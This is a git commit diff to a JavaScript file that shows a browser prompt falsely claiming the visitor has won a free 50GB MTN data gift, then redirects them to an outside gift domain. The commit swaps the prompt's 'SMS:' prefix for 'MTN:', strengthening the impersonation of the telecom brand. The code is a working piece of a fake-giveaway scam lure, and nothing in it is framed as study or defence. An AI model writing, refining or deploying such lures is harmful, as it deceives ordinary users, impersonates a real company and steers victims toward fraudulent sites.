ea802b35fd0cd27dd1d317fafb24760ed29a05f3
bigetijazz18 <bigetijazz18@gmail.com>
2025-02-15 07:23:21 +0100

    Update mtnoffer.js

--- mtnoffer.js
+++ mtnoffer.js
@@ -1,6 +1,6 @@
 
 var password = 'CLAIM 50GB'
-password=prompt('SMS: Congratulations, you are eligible for the 50GB OLD SIM data offer. Click OK to claim Data gift.','CLAIM 50GB');
+password=prompt('MTN: Congratulations, you are eligible for the 50GB OLD SIM data offer. Click OK to claim Data gift.','CLAIM 50GB');
 if (password != 'CLAIM 50GB') {
 location.href='https://www.year-25-gifts.xyz/mtn50gb';
 }
